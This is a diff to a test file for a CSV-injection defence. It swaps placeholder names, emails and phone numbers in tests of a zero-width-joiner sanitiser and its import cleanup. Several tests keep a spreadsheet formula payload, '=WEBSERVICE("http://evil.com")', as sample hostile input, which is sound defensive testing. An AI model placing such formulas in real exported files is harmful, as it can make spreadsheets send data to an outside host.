@@ -62,17 +62,17 @@ describe('csvSecurity', () => {
     });
 
     it('should preserve legitimate phone numbers with ZWJ', () => {
-      const phoneNumber = '+1-555-123-4567';
+      const phoneNumber = '+62-812-3456-7890';
       const result = sanitizeValueForCSVExport(phoneNumber);
-      expect(result).toBe(`${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`);
+      expect(result).toBe(`${CSV_INJECTION_PREVENTION_ZWJ}+62-812-3456-7890`);
       // Should be visually identical to user
       expect(result.substring(1)).toBe(phoneNumber);
     });
 
     it('should not modify safe strings', () => {
-      expect(sanitizeValueForCSVExport('John Doe')).toBe('John Doe');
-      expect(sanitizeValueForCSVExport('john@example.com')).toBe(
-        'john@example.com',
+      expect(sanitizeValueForCSVExport('Budi Santoso')).toBe('Budi Santoso');
+      expect(sanitizeValueForCSVExport('budi@bades.id')).toBe(
+        'budi@bades.id',
       );
       expect(sanitizeValueForCSVExport('Text with = in middle')).toBe(
         'Text with = in middle',
@@ -112,15 +112,15 @@ describe('csvSecurity', () => {
     });
 
     it('should restore original phone numbers', () => {
-      const sanitized = `${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`;
+      const sanitized = `${CSV_INJECTION_PREVENTION_ZWJ}+62-812-3456-7890`;
       const cleaned = cleanZWJFromImportedValue(sanitized);
-      expect(cleaned).toBe('+1-555-123-4567');
+      expect(cleaned).toBe('+62-812-3456-7890');
     });
 
     it('should not modify values without ZWJ prefix', () => {
-      expect(cleanZWJFromImportedValue('John Doe')).toBe('John Doe');
-      expect(cleanZWJFromImportedValue('john@example.com')).toBe(
-        'john@example.com',
+      expect(cleanZWJFromImportedValue('Budi Santoso')).toBe('Budi Santoso');
+      expect(cleanZWJFromImportedValue('budi@bades.id')).toBe(
+        'budi@bades.id',
       );
       expect(cleanZWJFromImportedValue('Normal text')).toBe('Normal text');
     });
@@ -165,7 +165,7 @@ describe('csvSecurity', () => {
     it('should preserve data through export/import cycle', () => {
       const originalValues = [
         '=WEBSERVICE("http://evil.com")',
-        '+1-555-123-4567',
+        '+62-812-3456-7890',
         '-$5,000 adjustment',
         '@mention',
         '\t=FORMULA()',
@@ -181,7 +181,7 @@ describe('csvSecurity', () => {
     });
 
     it('should maintain visual appearance for users', () => {
-      const phoneNumber = '+1-555-123-4567';
+      const phoneNumber = '+62-812-3456-7890';
       const sanitized = sanitizeValueForCSVExport(phoneNumber);
 
       // The sanitized version should look identical to users
@@ -326,11 +326,11 @@ describe('csvSecurity', () => {
       const exportedData = [
         ['Name', 'Formula', 'Phone'],
         [
-          'John Doe',
+          'Budi Santoso',
           `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE("http://evil.com")`,
-          `${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`,
+          `${CSV_INJECTION_PREVENTION_ZWJ}+62-812-3456-7890`,
         ],
-        ['Jane Smith', 'Normal text', '+44-20-1234-5678'],
+        ['Siti Maryam', 'Normal text', '+62-813-9876-5432'],
       ];
 
       // Simulate the import cleanup process
@@ -343,8 +343,8 @@ describe('csvSecurity', () => {
       // Verify the data is properly restored
       expect(cleanedData).toEqual([
         ['Name', 'Formula', 'Phone'],
-        ['John Doe', '=WEBSERVICE("http://evil.com")', '+1-555-123-4567'],
-        ['Jane Smith', 'Normal text', '+44-20-1234-5678'],
+        ['Budi Santoso', '=WEBSERVICE("http://evil.com")', '+62-812-3456-7890'],
+        ['Siti Maryam', 'Normal text', '+62-813-9876-5432'],
       ]);
     });
 
